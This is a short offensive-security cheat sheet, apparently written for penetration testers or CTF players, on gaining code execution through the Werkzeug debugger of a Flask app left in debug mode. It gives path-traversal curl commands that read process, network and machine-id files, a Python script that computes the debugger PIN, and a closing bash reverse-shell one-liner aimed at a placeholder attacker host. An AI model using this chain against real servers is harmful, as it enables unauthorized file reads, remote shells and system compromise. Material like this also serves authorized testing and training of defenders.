# Flask Debug Mode PIN RCE (Werkzeug)

When Flask runs in debug mode and crashes, the Werkzeug debugger exposes an interactive Python console protected by a PIN. If you have a file read vulnerability (LFI/path traversal), you can calculate the PIN and get RCE.

## Calculate the PIN

Collect via file read:
```bash
# 1. Username the process runs as
curl .../download?fn=../../../../proc/self/environ | tr '\0' '\n' | grep USER

# 2. MAC address of network interface
curl .../download?fn=../../../../proc/net/arp   # get interface name (e.g. eth0)
curl .../download?fn=../../../../sys/class/net/eth0/address
# Convert MAC xx:xx:xx:xx:xx:xx to decimal integer:
python3 -c "print(int('xx:xx:xx:xx:xx:xx'.replace(':',''), 16))"

# 3. Machine ID
curl .../download?fn=../../../../etc/machine-id
# If /etc/machine-id is empty, append /proc/self/cgroup last field
curl .../download?fn=../../../../proc/self/cgroup | tail -1 | cut -d/ -f3
```

PIN generation script:
```python
import hashlib, itertools

probably_public_bits = [
    'www-data',          # username from /proc/self/environ
    'flask.app',         # always this
    'Flask',             # always this
    '/app/venv/lib/python3.10/site-packages/flask/app.py',  # from crash traceback
]
private_bits = [
    '279275995014060',   # MAC as decimal integer
    'd4e6cb65d59544f3331ea0425dc555a1',  # /etc/machine-id (+ cgroup suffix if needed)
]

h = hashlib.sha1()
for bit in itertools.chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
num = int(h.hexdigest(), 16)
rv = num % (10 ** 9)
print(f'{rv:09d}')  # use this as the Werkzeug PIN
```

Navigate to the Werkzeug traceback URL → click terminal icon → enter PIN → get Python REPL → `import os; os.system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')`
